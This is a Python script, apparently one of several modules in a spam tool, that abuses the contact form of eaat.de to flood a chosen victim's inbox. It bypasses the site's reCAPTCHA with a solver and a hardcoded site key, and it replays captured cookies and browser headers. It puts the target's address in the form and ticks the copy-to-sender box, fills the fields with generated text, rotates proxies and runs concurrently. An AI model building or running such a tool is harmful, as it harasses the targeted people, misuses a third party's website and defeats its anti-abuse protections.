from os.path import basename

import requests

from module import Spam

pageurl = 'https://www.eaat.de/en/contact'
googlekey = '6LfmQSUUAAAAAEiA7HaFuJUfpbAJoiIOWACT9dtq'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        cap = self.solve_captcha(pageurl, googlekey)
        if not cap:
            return

        cookies = {
            '_pk_id.84.6ea6': '1d4a5932c85e3aba.1677756548.',
            '9621888435cf529a63fa8657698fb3ed': 'kk13lfs6oijihd5j32e2ougpu9',
            '_pk_ref.84.6ea6': '%5B%22%22%2C%22%22%2C1677772810%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
            '_pk_ses.84.6ea6': '1',
        }

        headers = {
            'authority': 'www.eaat.de',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryTwn7SrwGWKEB7ClW',
            # 'cookie': '_pk_id.84.6ea6=1d4a5932c85e3aba.1677756548.; 9621888435cf529a63fa8657698fb3ed=kk13lfs6oijihd5j32e2ougpu9; _pk_ref.84.6ea6=%5B%22%22%2C%22%22%2C1677772810%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.84.6ea6=1',
            'origin': 'https://www.eaat.de',
            'pragma': 'no-cache',
            'referer': 'https://www.eaat.de/en/contact',
            'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        }

        data = '------WebKitFormBoundaryTwn7SrwGWKEB7ClW\r\nContent-Disposition: form-data; name="form1"\r\n\r\nsend\r\n------WebKitFormBoundaryTwn7SrwGWKEB7ClW\r\nContent-Disposition: form-data; name="feld1001001"\r\n\r\ntest\r\n------WebKitFormBoundaryTwn7SrwGWKEB7ClW\r\nContent-Disposition: form-data; name="feld1002002"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryTwn7SrwGWKEB7ClW\r\nContent-Disposition: form-data; name="feld1003003"\r\n\r\ntest\r\n------WebKitFormBoundaryTwn7SrwGWKEB7ClW\r\nContent-Disposition: form-data; name="feld1004004"\r\n\r\ntest\r\n------WebKitFormBoundaryTwn7SrwGWKEB7ClW\r\nContent-Disposition: form-data; name="feld2001005"\r\n\r\ntest\r\n------WebKitFormBoundaryTwn7SrwGWKEB7ClW\r\nContent-Disposition: form-data; name="mailcopy"\r\n\r\n1\r\n------WebKitFormBoundaryTwn7SrwGWKEB7ClW\r\nContent-Disposition: form-data; name="datenschutz"\r\n\r\n1\r\n------WebKitFormBoundaryTwn7SrwGWKEB7ClW\r\nContent-Disposition: form-data; name="g-recaptcha-response"\r\n\r\ncap_que\r\n------WebKitFormBoundaryTwn7SrwGWKEB7ClW--\r\n'

        data = data.replace('cap_que', cap)
        data = data.replace('wezxasqw@gmail.com', target)
        data = data.replace('test', self.get_text()).encode()
        for _ in range(10):
            try:
                response = requests.post('https://www.eaat.de/en/contact', cookies=cookies, headers=headers, data=data, proxies=self.get_proxies())

                return response
            except Exception as e:
                self.logger.info(e)
        return


def main():
    s = 'Thank you for Your Message.'
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
